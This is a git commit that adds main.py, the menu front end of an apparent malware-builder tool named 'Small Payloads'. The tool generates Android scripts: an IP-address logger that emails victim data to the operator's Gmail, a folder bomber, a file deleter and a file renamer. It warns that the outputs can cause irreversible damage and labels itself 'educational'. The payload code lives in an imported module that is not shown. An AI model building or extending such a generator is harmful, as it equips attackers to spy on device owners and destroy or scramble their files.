f9d909a4330f4cd5ccd482964541f443d4a8d30c
AntibioticsABX <62002585+AntibioticsABX@users.noreply.github.com>
2020-10-25 17:36:56 +0630

    test commit

---
+++ main.py
@@ -0,0 +1,126 @@
+import os
+from androidpayloadengine import androidpayloadengine
+
+
+
+def banner():
+    print('''
+.dP"Y8 8b    d8    db    88     88         88""Yb    db    Yb  dP .dP"Y8 
+`Ybo." 88b  d88   dPYb   88     88         88__dP   dPYb    YbdP  `Ybo." 
+o.`Y8b 88YbdP88  dP__Yb  88  .o 88  .o     88"""   dP__Yb    8P   o.`Y8b 
+8bodP' 88 YY 88 dP""""Yb 88ood8 88ood8     88     dP""""Yb  dP    8bodP' 
+                            Created by Gen X  Version 1.0.0 beta        ''')
+
+
+
+def menu():
+    print()
+    banner()
+    print()
+    print('[+] This tool is only for educational purpose!.')
+    print('[+] Some Generated file can cause irreversible damage to your files..')
+    print('[+] * THIS IS BETA VERSION *')
+    print()
+    print('[1] Android little payloads')
+    print('[2] Windows payloads ( Coming Soon ) ')
+    choice = input('Enter Your choice : ')
+    if choice == '1':
+        androidpayloads()
+    elif choice == '2':
+        print('[!] Windows payload are not availible yet...')
+        os.system('clean')
+        menu()
+    elif choice == '3':
+        exit()
+    else:
+        print('Please Enter a valid number!')
+
+def androidpayloads():
+    print()
+    print('[1] Ip_address logger')
+    print('[2] Folder Bomber')
+    print('[3] Deleter')
+    print('[4] Renamer')
+    print('[00] Return to Main Menu ')
+    choice = input('Enter your choice : ')
+    if choice == '1':
+        Create_payloadONE()
+    elif choice == '2':
+        Create_payloadTWO()
+    elif choice == '3':
+        Create_payloadTHREE()
+    elif choice == '4':
+        Create_payloadFOUR()
+    elif choice == '00':
+        menu()
+    else:
+        print('Please Enter a valid number!')
+
+def Create_payloadONE():
+    email = input('Enter Your email : ')
+    passw = input('Enter Your password : ')
+    recv_email = input('Enter email that payload will send to : ')
+    file_name = input('Enter file_name : ')
+
+    if email.endswith('@gmail.com') & recv_email.endswith('@gmail.com'):
+        ENGINE = androidpayloadengine()
+        try:
+            with open(file_name+'.py', 'w') as file:
+                file.write(ENGINE.ip_address_logger(email, passw, recv_email))
+                file.close()
+            if os.path.isfile(file_name+'.py'):
+                print(f'Successfully Generated : {file_name}.py')
+            else:
+                print('Failed!')
+        except FileExistsError as e:
+            print(e)
+
+def Create_payloadTWO():
+    amount = input('Enter any amount you want : ')
+    folder_name = input('Enter folder name : ')
+    file_name = input('Enter file_name : ')
+    if int(amount) > 0:
+        ENGINE = androidpayloadengine()
+        try:
+            with open(file_name+'.py', 'w') as file:
+                file.write(ENGINE.folder_bomber(amount, folder_name))
+                file.close()
+                if os.path.isfile(file_name + '.py'):
+                    print(f'Successfully Generated : {file_name}.py')
+                else:
+                    print('Failed!')
+        except FileExistsError as e:
+            print(e)
+
+def Create_payloadTHREE():
+    file_name = input('Enter file_name : ')
+    ENGINE = androidpayloadengine()
+    try:
+        with open(file_name+'.py' , 'w') as file:
+            file.write(ENGINE.big_deleter())
+            file.close()
+            if os.path.isfile(file_name + '.py'):
+                print(f'Successfully Generated : {file_name}.py')
+            else:
+                print('Failed!')
+    except FileExistsError as e:
+        print(e)
+
+def Create_payloadFOUR():
+    file_name = input('Enter file_name : ')
+    ENGINE = androidpayloadengine()
+    try:
+        with open(file_name+'.py' , 'w') as file:
+            file.write(ENGINE.Renamer())
+            file.close()
+            if os.path.isfile(file_name + '.py'):
+                print(f'Successfully Generated : {file_name}.py')
+            else:
+                print('Failed!')
+    except FileExistsError as e:
+        print(e)
+
+
+
+
+menu()
